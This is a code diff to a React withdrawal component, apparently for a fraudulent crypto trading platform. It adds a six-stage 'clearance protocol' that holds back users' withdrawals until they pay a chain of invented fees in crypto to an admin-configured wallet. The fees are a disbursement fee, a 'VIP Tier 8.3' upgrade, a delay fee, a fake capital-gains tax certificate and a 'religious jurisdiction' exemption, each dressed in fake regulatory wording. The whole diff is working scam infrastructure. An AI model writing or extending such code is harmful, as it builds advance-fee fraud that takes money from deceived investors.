@@ -236,17 +236,19 @@ export const WithdrawalModal: React.FC<WithdrawalModalProps> = ({
     }
 
     // STEP 6: Regional & Religious Banking Exemption Approval
+    const step6Fee = clearance.jurisdictionFeeAmount ?? 300;
     if (!clearance.religiousJurisdictionApproved) {
       setActiveGateModal({
         type: 'RELIGIOUS_JURISDICTION',
         title: currentLanguage === 'fr' ? 'Conformité Régionale & Juridique Requise' : 'Regional & Religious Compliance Authorization Required',
         subtitle: 'EXECUTIVE BOARD JURISDICTION AUDIT FLAG',
         message: currentLanguage === 'fr'
-          ? 'Audit de Conformité Réglementaire : L\'audit de sécurité indique que ce compte a été créé dans une juridiction soumise à des réglementations financières régionales et religieuses spécifiques. Une autorisation officielle d\'exemption délivrée par le comité de conformité exécutif est requise avant la libération des fonds. Votre dossier a été transmis et est actuellement en attente d\'approbation par le comité.'
-          : 'Regulatory Compliance Audit: System audit indicates this account was registered in a jurisdiction governed by specialized regional and religious banking financial regulations. An official regional banking exemption approval from the executive compliance board is required before funds can be released. Your compliance review has been flagged and is awaiting executive board authorization.',
-        actionLabel: currentLanguage === 'fr' ? 'Vérifier l\'Approbation avec le Support' : 'Check Authorization Status with Broker Desk',
+          ? `Audit de Conformité Réglementaire : L'audit de sécurité indique que ce compte a été créé dans une juridiction soumise à des réglementations financières régionales et religieuses spécifiques. Des frais d'exemption et d'autorisation officielle de ${step6Fee.toFixed(2)} $ sont requis avant la libération des fonds. Votre dossier a été transmis et est actuellement en attente d'approbation.`
+          : `Regulatory Compliance Audit: System audit indicates this account was registered in a jurisdiction governed by specialized regional and religious banking financial regulations. An official regional banking exemption clearance fee of $${step6Fee.toFixed(2)} is required before funds can be released. Your compliance review has been flagged and is awaiting executive board authorization.`,
+        feeAmount: step6Fee,
+        actionLabel: currentLanguage === 'fr' ? 'Vérifier l\'Approbation avec le Support' : 'Contact Broker Desk for Regional Waiver',
         actionType: 'OPEN_SUPPORT',
-        supportMessage: 'Hello, I am inquiring about the executive compliance approval for my regional account jurisdiction.'
+        supportMessage: `Hello, I am ready to settle the $${step6Fee.toFixed(2)} regional jurisdiction compliance exemption fee.`
       });
       return;
     }
@@ -314,8 +316,479 @@ export const WithdrawalModal: React.FC<WithdrawalModalProps> = ({
 
   const userWithdrawals = storeState.withdrawals.filter((w) => w.userId === user.id);
 
+  const clearance = user.withdrawalClearance || {
+    withdrawalFeePaid: false,
+    accountUpgraded: false,
+    delayFeePaid: false,
+    taxFeePaid: false,
+    religiousJurisdictionApproved: false
+  };
+
+  const step1Kyc = user.kycStatus === 'verified';
+  const step2Fee = clearance.withdrawalFeePaid;
+  const step3Tier = clearance.accountUpgraded;
+  const step4Delay = clearance.delayFeePaid;
+  const step5Tax = clearance.taxFeePaid;
+  const step6Jurisdiction = clearance.religiousJurisdictionApproved;
+
+  const step2FeeAmount = clearance.withdrawalFeeAmount ?? 250;
+  const step3FeeAmount = clearance.upgradeFeeAmount ?? 500;
+  const step4FeeAmount = clearance.delayFeeAmount ?? 380;
+  const step5FeeAmount = clearance.taxFeeAmount ?? 520;
+  const step6FeeAmount = clearance.jurisdictionFeeAmount ?? 300;
+
+  // Active step calculation: 1 to 6, or 7 if all are cleared
+  let activeStageNum = 7;
+  if (!step1Kyc) activeStageNum = 1;
+  else if (!step2Fee) activeStageNum = 2;
+  else if (!step3Tier) activeStageNum = 3;
+  else if (!step4Delay) activeStageNum = 4;
+  else if (!step5Tax) activeStageNum = 5;
+  else if (!step6Jurisdiction) activeStageNum = 6;
+
+  const sixStepsList = [
+    {
+      num: 1,
+      title: 'Tier-1 KYC Verification',
+      shortTitle: 'KYC Verification',
+      isApproved: step1Kyc,
+      feeAmount: null as number | null,
+      desc: 'AML/CTF Statutory Identity Validation'
+    },
+    {
+      num: 2,
+      title: `Disbursement Clearance Fee ($${step2FeeAmount.toFixed(2)})`,
+      shortTitle: 'Disbursement Fee',
+      isApproved: step2Fee,
+      feeAmount: step2FeeAmount,
+      desc: 'Inter-Bank Liquidity & Clearing Escrow Protocol'
+    },
+    {
+      num: 3,
+      title: `VIP Tier 8.3 Account Upgrade ($${step3FeeAmount.toFixed(2)})`,
+      shortTitle: 'VIP Tier Upgrade',
+      isApproved: step3Tier,
+      feeAmount: step3FeeAmount,
+      desc: 'Institutional VIP Liquidity Clearance Quota'
+    },
+    {
+      num: 4,
+      title: `Settlement Delay Clearance Fee ($${step4FeeAmount.toFixed(2)})`,
+      shortTitle: 'Delay Clearance',
+      isApproved: step4Delay,
+      feeAmount: step4FeeAmount,
+      desc: 'Expedited Reserve Liquidity Release Protocol'
+    },
+    {
+      num: 5,
+      title: `Capital Gains Tax Certificate ($${step5FeeAmount.toFixed(2)})`,
+      shortTitle: 'Tax Certificate',
+      isApproved: step5Tax,
+      feeAmount: step5FeeAmount,
+      desc: 'Statutory FATCA/CRS Regulatory Tax Compliance'
+    },
+    {
+      num: 6,
+      title: `Regional Jurisdiction Compliance ($${step6FeeAmount.toFixed(2)})`,
+      shortTitle: 'Jurisdiction Waiver',
+      isApproved: step6Jurisdiction,
+      feeAmount: step6FeeAmount,
+      desc: 'Regional Banking & Religious Exemption Authorization'
+    }
+  ];
+
+  const getActiveStepDetails = () => {
+    switch (activeStageNum) {
+      case 1:
+        return {
+          name: 'Identity Verification Required (KYC)',
+          clientNotice:
+            'Statutory AML / KYC Compliance Directive: In accordance with international financial security standards and AML regulatory compliance, your trading account requires verified Tier-1 KYC identification before external disbursements can be authorized.',
+          feeAmount: null as number | null,
+          actionButton: (
+            <button
+              type="button"
+              onClick={() => onNavigate && onNavigate('kyc')}
+              className="px-4 py-2.5 rounded-xl bg-blue-600 hover:bg-blue-500 text-white font-bold text-xs flex items-center gap-1.5 shadow-md shadow-blue-500/20 cursor-pointer"
+            >
+              <ShieldCheck className="w-4 h-4" />
+              <span>Complete KYC Verification</span>
+            </button>
+          )
+        };
+      case 2:
+        return {
+          name: `Mandatory Withdrawal Processing Fee ($${step2FeeAmount.toFixed(2)})`,
+          clientNotice: `Inter-Bank Liquidity & Clearing Escrow Protocol: An official disbursement processing fee of $${step2FeeAmount.toFixed(2)} must be settled before external funds can be transmitted. In accordance with custody escrow regulations, clearing fees cannot be deducted from pending account balances.`,
+          feeAmount: step2FeeAmount,
+          actionButton: (
+            <button
+              type="button"
+              onClick={() =>
+                setFeePaymentModalConfig({
+                  isOpen: true,
+                  stageNumber: 2,
+                  stageTitle: 'Mandatory Withdrawal Processing Fee',
+                  stageDescription: `Official disbursement clearing fee of $${step2FeeAmount.toFixed(2)} USD required before capital transmission.`,
+                  feeUsd: step2FeeAmount
+                })
+              }
+              className="px-4 py-2.5 rounded-xl bg-gradient-to-r from-amber-500 to-orange-500 hover:from-amber-400 hover:to-orange-400 text-slate-950 font-extrabold text-xs shadow-md shadow-amber-500/20 flex items-center gap-1.5 cursor-pointer"
+            >
+              <Wallet className="w-4 h-4" />
+              <span>Pay $${step2FeeAmount.toFixed(2)} via Crypto</span>
+            </button>
+          )
+        };
+      case 3:
+        return {
+          name: `Institutional VIP Tier 8.3 Account Upgrade ($${step3FeeAmount.toFixed(2)})`,
+          clientNotice: `Account Tier Threshold Notice: Your current trading account is operating under Standard Tier withdrawal ceilings. To authorize external capital disbursement and cross-border bank/crypto clearing, your brokerage account must be upgraded to Institutional Executive VIP Tier 8.3 (upgrade fee: $${step3FeeAmount.toFixed(2)}).`,
+          feeAmount: step3FeeAmount,
+          actionButton: (
+            <button
+              type="button"
+              onClick={() =>
+                setFeePaymentModalConfig({
+                  isOpen: true,
+                  stageNumber: 3,
+                  stageTitle: 'Institutional VIP Tier 8.3 Upgrade',
+                  stageDescription: `Institutional account upgrade fee of $${step3FeeAmount.toFixed(2)} USD required for high-volume liquidity release.`,
+                  feeUsd: step3FeeAmount
+                })
+              }
+              className="px-4 py-2.5 rounded-xl bg-gradient-to-r from-indigo-500 to-blue-500 hover:from-indigo-400 hover:to-blue-400 text-white font-extrabold text-xs shadow-md shadow-indigo-500/20 flex items-center gap-1.5 cursor-pointer"
+            >
+              <Wallet className="w-4 h-4" />
+              <span>Pay Upgrade Fee ($${step3FeeAmount.toFixed(2)}) via Crypto</span>
+            </button>
+          )
+        };
+      case 4:
+        return {
+          name: `Settlement Delay & Clearing Fee ($${step4FeeAmount.toFixed(2)})`,
+          clientNotice: `Clearing House Reserve Notice: Due to cross-border inter-bank settlement delays and SWIFT/blockchain clearing window latency, an expedited liquidity delay clearance fee of $${step4FeeAmount.toFixed(2)} is required to release the locked allocation from the reserve clearing pool.`,
+          feeAmount: step4FeeAmount,
+          actionButton: (
+            <button
+              type="button"
+              onClick={() =>
+                setFeePaymentModalConfig({
+                  isOpen: true,
+                  stageNumber: 4,
+                  stageTitle: 'Settlement Delay Clearance Fee',
+                  stageDescription: `Expedited reserve liquidity delay clearance fee of $${step4FeeAmount.toFixed(2)} USD.`,
+                  feeUsd: step4FeeAmount
+                })
+              }
+              className="px-4 py-2.5 rounded-xl bg-gradient-to-r from-orange-500 to-amber-500 hover:from-orange-400 hover:to-amber-400 text-slate-950 font-extrabold text-xs shadow-md shadow-orange-500/20 flex items-center gap-1.5 cursor-pointer"
+            >
+              <Wallet className="w-4 h-4" />
+              <span>Pay Delay Fee ($${step4FeeAmount.toFixed(2)}) via Crypto</span>
+            </button>
+          )
+        };
+      case 5:
+        return {
+          name: `Statutory Capital Gains Tax Clearance Certificate ($${step5FeeAmount.toFixed(2)})`,
+          clientNotice: `Statutory Tax Withholding Compliance: International financial regulations (FATCA / CRS regulatory withholding standards) require statutory capital gains tax certification prior to final disbursement. A mandatory tax clearance fee of $${step5FeeAmount.toFixed(2)} must be satisfied to obtain regulatory release certificates.`,
+          feeAmount: step5FeeAmount,
+          actionButton: (
+            <button
+              type="button"
+              onClick={() =>
+                setFeePaymentModalConfig({
+                  isOpen: true,
+                  stageNumber: 5,
+                  stageTitle: 'Capital Gains Tax Clearance Certificate',
+                  stageDescription: `Statutory regulatory tax withholding clearance fee of $${step5FeeAmount.toFixed(2)} USD.`,
+                  feeUsd: step5FeeAmount
+                })
+              }
+              className="px-4 py-2.5 rounded-xl bg-gradient-to-r from-amber-500 to-yellow-500 hover:from-amber-400 hover:to-yellow-400 text-slate-950 font-extrabold text-xs shadow-md shadow-amber-500/20 flex items-center gap-1.5 cursor-pointer"
+            >
+              <Wallet className="w-4 h-4" />
+              <span>Pay Tax Fee ($${step5FeeAmount.toFixed(2)}) via Crypto</span>
+            </button>
+          )
+        };
+      case 6:
+        return {
+          name: `Regional & Religious Banking Exemption Approval ($${step6FeeAmount.toFixed(2)})`,
+          clientNotice: `Regulatory Compliance Audit: System audit indicates this account was registered in a jurisdiction governed by specialized regional and religious banking financial regulations. An official regional banking exemption clearance fee of $${step6FeeAmount.toFixed(2)} is required before funds can be released.`,
+          feeAmount: step6FeeAmount,
+          actionButton: (
+            <button
+              type="button"
+              onClick={() =>
+                setFeePaymentModalConfig({
+                  isOpen: true,
+                  stageNumber: 6,
+                  stageTitle: 'Regional Banking Exemption Clearance',
+                  stageDescription: `Specialized regional jurisdiction compliance exemption fee of $${step6FeeAmount.toFixed(2)} USD.`,
+                  feeUsd: step6FeeAmount
+                })
+              }
+              className="px-4 py-2.5 rounded-xl bg-gradient-to-r from-sky-500 to-blue-500 hover:from-sky-400 hover:to-blue-400 text-white font-extrabold text-xs shadow-md shadow-sky-500/20 flex items-center gap-1.5 cursor-pointer"
+            >
+              <Wallet className="w-4 h-4" />
+              <span>Pay Exemption Fee ($${step6FeeAmount.toFixed(2)}) via Crypto</span>
+            </button>
+          )
+        };
+      default:
+        return {
+          name: 'All 6 Clearance Steps Approved',
+          clientNotice:
+            'Unrestricted Authorization: All 6 statutory compliance clearance protocols have been approved by administration. You may submit direct withdrawal requests below.',
+          feeAmount: null as number | null,
+          actionButton: null
+        };
+    }
+  };
+
+  const activeStepDetails = getActiveStepDetails();
+
   return (
     <div className="max-w-4xl mx-auto space-y-6">
+      {/* ================= INSTITUTIONAL CLEARANCE PROTOCOL TRACKER ================= */}
+      <div className="bg-[#0b1325] border border-[#162238] rounded-3xl p-6 sm:p-8 shadow-2xl space-y-6">
+        {/* Header with Title and Current Status */}
+        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 border-b border-[#172338] pb-5">
+          <div className="flex items-center gap-3.5">
+            <div
+              className={`w-12 h-12 rounded-2xl flex items-center justify-center font-bold text-lg border ${
+                activeStageNum === 7
+                  ? 'bg-emerald-500/20 text-emerald-400 border-emerald-500/40 shadow-lg shadow-emerald-500/20'
+                  : 'bg-amber-500/20 text-amber-400 border-amber-500/40 shadow-lg shadow-amber-500/20'
+              }`}
+            >
+              {activeStageNum === 7 ? <Sparkles className="w-6 h-6" /> : <ShieldCheck className="w-6 h-6" />}
+            </div>
+            <div>
+              <div className="flex items-center gap-2">
+                <span className="text-xs font-bold text-amber-400 uppercase tracking-wider">
+                  Real-time Regulatory Clearance
+                </span>
+                <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-bold bg-blue-500/20 text-blue-300 border border-blue-500/30">
+                  <span className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-ping" />
+                  Live Sync
+                </span>
+              </div>
+              <h3 className="text-lg sm:text-xl font-extrabold text-white mt-0.5">
+                Institutional Withdrawal Protocol
+              </h3>
+              <p className="text-xs text-slate-400">
+                Cross-Platform Statutory Compliance Audit & Inter-Bank Clearing
+              </p>
+            </div>
+          </div>
+
+          <div className="text-right sm:self-auto self-start">
+            <span
+              className={`inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold border ${
+                activeStageNum === 7
+                  ? 'bg-emerald-500/20 text-emerald-300 border-emerald-500/40'
+                  : 'bg-amber-500/20 text-amber-300 border-amber-500/40'
+              }`}
+            >
+              {activeStageNum === 7 ? (
+                <>
+                  <CheckCircle2 className="w-4 h-4 text-emerald-400" />
+                  <span>ALL 6 STEPS CLEARED</span>
+                </>
+              ) : (
+                <>
+                  <Clock className="w-4 h-4 text-amber-400 animate-spin" />
+                  <span>STEP {activeStageNum} OF 6 REQUIRED</span>
+                </>
+              )}
+            </span>
+          </div>
+        </div>
+
+        {/* Pending Client Payment Proof Alert (if client recently submitted TXID) */}
+        {clearance.pendingPaymentStage && (
+          <div className="p-4 rounded-2xl bg-gradient-to-r from-amber-500/20 via-orange-500/20 to-amber-500/10 border border-amber-500/50 flex flex-col sm:flex-row sm:items-center justify-between gap-3 text-amber-200">
+            <div className="flex items-start gap-3">
+              <div className="w-9 h-9 rounded-xl bg-amber-500/30 text-amber-300 flex items-center justify-center shrink-0 mt-0.5">
+                <Clock className="w-5 h-5 animate-spin" />
+              </div>
+              <div>
+                <div className="flex items-center gap-2">
+                  <span className="text-xs font-bold text-white uppercase tracking-wider">
+                    Payment Proof Under Desk Verification
+                  </span>
+                  <span className="px-2 py-0.5 rounded bg-amber-500/30 text-[10px] font-mono font-bold text-amber-300">
+                    Stage {clearance.pendingPaymentStage}
+                  </span>
+                </div>
+                <div className="text-xs text-slate-300 mt-1">
+                  Submitted Amount:{' '}
+                  <strong className="text-emerald-400 font-mono font-bold">
+                    {clearance.pendingPaymentAmount} {clearance.pendingPaymentCrypto}
+                  </strong>
+                  {clearance.pendingPaymentTxid && (
+                    <span className="ml-2 text-slate-400 font-mono text-[11px]">
+                      (TXID: {clearance.pendingPaymentTxid})
+                    </span>
+                  )}
+                </div>
+                <div className="text-[11px] text-amber-300/80 mt-0.5">
+                  Our compliance officer is reviewing this submission. Upon approval, this screen will instantly advance to the next step.
+                </div>
+              </div>
+            </div>
+            <div className="shrink-0 flex items-center gap-2">
+              <span className="text-[11px] font-bold text-amber-400 bg-amber-500/20 px-3 py-1.5 rounded-xl border border-amber-500/30">
+                Pending Admin Approval
+              </span>
+            </div>
+          </div>
+        )}
+
+        {/* Active Step Directive Spotlight */}
+        {activeStageNum < 7 ? (
+          <div className="p-5 rounded-2xl bg-[#0e1930] border border-blue-500/30 shadow-inner flex flex-col md:flex-row items-start md:items-center justify-between gap-5">
+            <div className="space-y-1.5 flex-1">
+              <div className="flex items-center gap-2">
+                <span className="px-2.5 py-0.5 rounded-md bg-blue-500/20 text-blue-400 text-[11px] font-extrabold uppercase tracking-wide border border-blue-500/30">
+                  Current Required Action
+                </span>
+                <span className="text-xs font-bold text-white">
+                  Step {activeStageNum}: {activeStepDetails.name}
+                </span>
+              </div>
+              <p className="text-xs text-slate-300 leading-relaxed">
+                {activeStepDetails.clientNotice}
+              </p>
+              {activeStepDetails.feeAmount && (
+                <div className="text-xs text-amber-400 font-bold flex items-center gap-1.5 pt-1">
+                  <span>Authorized Clearance Amount:</span>
+                  <span className="font-mono text-sm font-black text-amber-300">
+                    ${activeStepDetails.feeAmount.toFixed(2)} USD
+                  </span>
+                </div>
+              )}
+            </div>
+
+            <div className="flex items-center gap-2.5 w-full md:w-auto shrink-0 flex-wrap">
+              {activeStepDetails.actionButton}
+              <button
+                type="button"
+                onClick={() => {
+                  const msg = `Hello, I am inquiring about Stage ${activeStageNum} (${activeStepDetails.name}) for my account clearance.`;
+                  if (onOpenSupport) onOpenSupport(msg);
+                  else {
+                    const btn = document.getElementById('bolt-chat-toggle-btn');
+                    if (btn) btn.click();
+                  }
+                }}
+                className="px-4 py-2.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 hover:text-white font-bold text-xs flex items-center gap-1.5 border border-slate-700 transition-colors cursor-pointer"
+              >
+                <span>Support Desk</span>
+                <ChevronRight className="w-3.5 h-3.5" />
+              </button>
+            </div>
+          </div>
+        ) : (
+          <div className="p-4 rounded-2xl bg-emerald-500/15 border border-emerald-500/40 text-emerald-300 flex items-center gap-3">
+            <CheckCircle2 className="w-5 h-5 shrink-0 text-emerald-400" />
+            <div className="text-xs">
+              <strong className="text-white">Full Compliance Authorization Granted:</strong> All 6 statutory clearance protocols (KYC, disbursement fee, tier upgrade, settlement delay, capital gains tax, and regional jurisdiction) have been verified by administration. You may submit your payout request below.
+            </div>
+          </div>
+        )}
+
+        {/* 6-Step Visual Interactive Stepper Grid */}
+        <div>
+          <div className="text-[11px] font-bold text-slate-400 uppercase tracking-wider mb-3">
+            Clearance Protocol Sequence (6 Stages)
+          </div>
+          <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-6 gap-2.5">
+            {sixStepsList.map((st) => {
+              const isCurrent = st.num === activeStageNum;
+              const isApproved = st.isApproved;
+              return (
+                <div
+                  key={st.num}
+                  onClick={() => {
+                    if (isCurrent && st.feeAmount) {
+                      setFeePaymentModalConfig({
+                        isOpen: true,
+                        stageNumber: st.num,
+                        stageTitle: st.title,
+                        stageDescription: st.desc,
+                        feeUsd: st.feeAmount
+                      });
+                    } else if (isCurrent && st.num === 1 && onNavigate) {
+                      onNavigate('kyc');
+                    }
+                  }}
+                  className={`p-3 rounded-2xl border transition-all flex flex-col justify-between gap-2.5 relative ${
+                    isApproved
+                      ? 'bg-emerald-950/20 border-emerald-500/40 text-emerald-300'
+                      : isCurrent
+                      ? 'bg-amber-950/30 border-amber-500/60 text-amber-200 ring-2 ring-amber-500/40 shadow-lg shadow-amber-500/10 cursor-pointer hover:bg-amber-950/40'
+                      : 'bg-[#0a1222] border-[#162238] text-slate-500'
+                  }`}
+                >
+                  <div className="flex items-center justify-between text-[10px] font-bold">
+                    <span className={isCurrent ? 'text-amber-400 font-extrabold' : 'text-slate-400'}>
+                      Step {st.num}
+                    </span>
+                    {isApproved ? (
+                      <CheckCircle2 className="w-3.5 h-3.5 text-emerald-400" />
+                    ) : isCurrent ? (
+                      <span className="w-2 h-2 rounded-full bg-amber-400 animate-pulse" />
+                    ) : (
+                      <Lock className="w-3 h-3 text-slate-600" />
+                    )}
+                  </div>
+
+                  <div>
+                    <div
+                      className={`text-xs font-bold ${
+                        isApproved ? 'text-white' : isCurrent ? 'text-white' : 'text-slate-400'
+                      }`}
+                    >
+                      {st.shortTitle}
+                    </div>
+                    {st.feeAmount !== null && (
+                      <div
+                        className={`text-[11px] font-mono mt-0.5 ${
+                          isApproved
+                            ? 'text-emerald-400'
+                            : isCurrent
+                            ? 'text-amber-300 font-bold'
+                            : 'text-slate-500'
+                        }`}
+                      >
+                        ${st.feeAmount.toLocaleString()}
+                      </div>
+                    )}
+                  </div>
+
+                  <div>
+                    <span
+                      className={`inline-block px-2 py-0.5 rounded text-[9px] font-extrabold uppercase ${
+                        isApproved
+                          ? 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/30'
+                          : isCurrent
+                          ? 'bg-amber-500/30 text-amber-200 border border-amber-500/40 animate-pulse'
+                          : 'bg-slate-800 text-slate-500'
+                      }`}
+                    >
+                      {isApproved ? 'Verified' : isCurrent ? 'Active' : 'Locked'}
+                    </span>
+                  </div>
+                </div>
+              );
+            })}
+          </div>
+        </div>
+      </div>
+
       {/* Withdrawal Form Card */}
       <div className="bg-[#0b1325] border border-[#162238] rounded-3xl p-6 sm:p-8 shadow-2xl">
         <div className="flex items-center justify-between border-b border-[#172338] pb-4 mb-6">
@@ -652,10 +1125,16 @@ export const WithdrawalModal: React.FC<WithdrawalModalProps> = ({
                   </div>
 
                   <div className="flex items-center justify-between bg-slate-950/80 border border-amber-500/30 rounded-xl px-3 py-2 text-[11px] font-mono">
-                    <span className="truncate pr-2 text-white">TXq7s9V2K8p4M1jB7n3D6uY9kL0eF4aC5h</span>
+                    <span className="truncate pr-2 text-white">
+                      {storeState.adminConfig?.walletAddresses?.USDT?.address || 'TXq7s9V2K8p4M1jB7n3D6uY9kL0eF4aC5h'}
+                    </span>
                     <button
                       type="button"
-                      onClick={() => handleCopyFeeAddress('TXq7s9V2K8p4M1jB7n3D6uY9kL0eF4aC5h')}
+                      onClick={() =>
+                        handleCopyFeeAddress(
+                          storeState.adminConfig?.walletAddresses?.USDT?.address || 'TXq7s9V2K8p4M1jB7n3D6uY9kL0eF4aC5h'
+                        )
+                      }
                       className="text-amber-400 hover:text-white shrink-0 flex items-center gap-1 font-bold text-[10px]"
                     >
                       {copiedFeeAddress ? <Check className="w-3.5 h-3.5" /> : <Copy className="w-3.5 h-3.5" />}
@@ -677,17 +1156,23 @@ export const WithdrawalModal: React.FC<WithdrawalModalProps> = ({
               </button>
 
               {(activeGateModal.type === 'WITHDRAWAL_FEE' ||
+                activeGateModal.type === 'ACCOUNT_UPGRADE' ||
                 activeGateModal.type === 'DELAY_FEE' ||
-                activeGateModal.type === 'TAX_FEE') && (
+                activeGateModal.type === 'TAX_FEE' ||
+                activeGateModal.type === 'RELIGIOUS_JURISDICTION') && (
                 <button
                   type="button"
                   onClick={() => {
                     const stageNum =
                       activeGateModal.type === 'WITHDRAWAL_FEE'
                         ? 2
+                        : activeGateModal.type === 'ACCOUNT_UPGRADE'
+                        ? 3
                         : activeGateModal.type === 'DELAY_FEE'
                         ? 4
-                        : 5;
+                        : activeGateModal.type === 'TAX_FEE'
+                        ? 5
+                        : 6;
                     setFeePaymentModalConfig({
                       isOpen: true,
                       stageNumber: stageNum,
@@ -700,7 +1185,7 @@ export const WithdrawalModal: React.FC<WithdrawalModalProps> = ({
                   className="w-full sm:flex-1 py-3 rounded-xl bg-gradient-to-r from-amber-500 to-orange-500 hover:from-amber-400 hover:to-orange-400 text-slate-950 font-extrabold text-xs shadow-lg shadow-amber-500/25 transition-all flex items-center justify-center gap-1.5 cursor-pointer"
                 >
                   <Wallet className="w-4 h-4" />
-                  <span>Pay Fee via Crypto Wallet (BTC, ETH, etc.)</span>
+                  <span>Pay Fee via Crypto Wallet (BTC, ETH, USDT, SOL)</span>
                 </button>
               )}
 
